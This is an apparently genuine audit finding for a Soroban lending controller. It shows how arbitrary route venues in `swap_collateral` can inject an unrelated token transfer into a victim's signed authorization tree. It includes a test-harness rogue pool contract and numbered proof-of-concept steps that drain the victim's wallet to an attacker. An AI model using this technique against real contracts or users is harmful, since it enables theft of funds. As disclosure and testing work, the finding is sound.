### Title
Arbitrary route venues can steal unrelated wallet funds through the caller’s `swap_collateral` authorization - (File: `contracts/controller/src/strategies/swap.rs`)

### Summary
`swap_collateral` accepts caller-controlled route bytes and forwards them to the configured router without restricting which venue contracts the route may invoke. [1](#0-0) [2](#0-1)  A malicious venue embedded in that route can place an unrelated token transfer beneath the caller’s `swap_collateral` authorization tree; if the simulated tree is signed, the venue transfers the victim’s wallet tokens to the attacker while still returning sufficient swap output for the strategy to complete. [3](#0-2) 

### Finding Description
The `swap_collateral(caller, account_id, current, amount, new, swap)` entrypoint checks only that the caller controls the account and that the destination asset can be supplied, then withdraws collateral and passes `swap` into `withdraw_and_swap_from_supply`. [4](#0-3)  `swap_tokens` narrowly authorizes the controller’s own `token_in.transfer(controller, router, amount_in)`, but it still executes the attacker-supplied opaque route through `router.execute_strategy(controller, amount_in, swap)`. [5](#0-4)  The controller afterward validates only the routed input spend and positive output delta; it does not bind the route’s external contract calls to an allowlist or otherwise prevent a venue from requesting unrelated authority from the original caller. [6](#0-5) 

The harness demonstrates the resulting authorization confusion: a route-named rogue pool calls `token.transfer(victim, attacker, amount)` while the router returns the expected output. [7](#0-6) [8](#0-7)  Simulation records that unrelated token transfer as a child of the victim’s `swap_collateral` invocation, and signing that tree makes the transfer execute. [9](#0-8)  With the same route but a benign root-only tree, the host rejects the theft; with the simulation-produced tree, the victim’s entire tested wallet balance moves to the attacker. [10](#0-9) 

### Impact Explanation
A victim can lose unrelated wallet assets that were never supplied to the lending account, while the attacker can still provide sufficient output for the intended collateral swap to succeed. [11](#0-10)  The impact is theft of user funds, and the stolen amount is bounded only by balances the malicious venue can cause the victim to authorize under the signed invocation tree. [12](#0-11) 

### Likelihood Explanation
The attack requires the victim to submit a malicious route and sign the expanded authorization tree produced by simulation, so it is not an unauthenticated direct drain. [13](#0-12)  Likelihood is still meaningful because route bytes are opaque to the controller, strategy users commonly rely on simulation-generated authorization entries, and the transaction remains economically valid when the rogue venue also pays fair output. [14](#0-13) [11](#0-10) 

### Recommendation
Restrict route execution to governance-approved venue contracts and approved token contracts, rather than allowing route-selected arbitrary addresses below the caller’s authorization. [2](#0-1)  The venue registry should cover every route-invoked pool, and admission should verify the expected ABI and token set before lending strategies can route through it. [7](#0-6)  Until venue allowlisting exists, client and wallet integrations should decode simulated authorization trees and reject any `swap_collateral`, `swap_debt`, `multiply`, or `repay_debt_with_collateral` invocation containing children beyond the expected strategy transfers. [15](#0-14) 

### Proof of Concept
1. Give the victim a solvent account with withdrawable collateral and an unrelated wallet-token balance. [16](#0-15) 
2. Deploy a malicious route venue storing `(victim, wallet_token, attacker, amount)`. [17](#0-16) 
3. Craft `swap` bytes so the router calls that venue while still paying enough `token_out` for the controller’s positive-output check. [18](#0-17) [6](#0-5) 
4. Have the victim call `swap_collateral(caller=victim, account_id=victim_account, current=current_asset, amount=swap_amount, new=target_asset, swap=crafted_route)`. [19](#0-18) 
5. Simulation records `wallet_token.transfer(victim, attacker, amount)` beneath the victim’s `swap_collateral` root. [20](#0-19) 
6. Signing that simulation executes the unrelated transfer: the victim’s wallet-token balance becomes zero, the attacker receives it, and the victim still receives the expected swapped collateral credit. [11](#0-10) [12](#0-11)

### Citations

**File:** contracts/controller/src/lib.rs (L283-300)
```rust
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
```

**File:** contracts/controller/src/strategies/swap.rs (L19-38)
```rust
    swap: &StrategySwap,
) -> i128 {
    require_positive_amount(env, amount_in);
    assert_with_error!(env, !swap.is_empty(), GenericError::InvalidPayments);

    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-46)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L56-70)
```rust
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L82-100)
```rust
impl Scene {
    /// Debt-free Alice with 10 000 USDC supplied and an unrelated token in her wallet.
    fn new() -> Self {
        let mut t = LendingTest::new().standard_two_asset().build();
        t.supply(ALICE, "USDC", 10_000.0);
        let alice = t.get_or_create_user(ALICE);
        let account_id = t.resolve_account_id(ALICE);

        let router = t.env.register(UnlistedPoolRouter, ());
        t.ctrl_client().set_swap_aggregator(&router);
        t.resolve_market("ETH")
            .token_admin
            .mint(&router, &(4 * FAIR_OUT_ETH));

        let wallet_token = t
            .env
            .register_stellar_asset_contract_v2(t.admin.clone())
            .address();
        token::StellarAssetClient::new(&t.env, &wallet_token).mint(&alice, &WALLET_BALANCE);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L199-226)
```rust
    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-268)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```
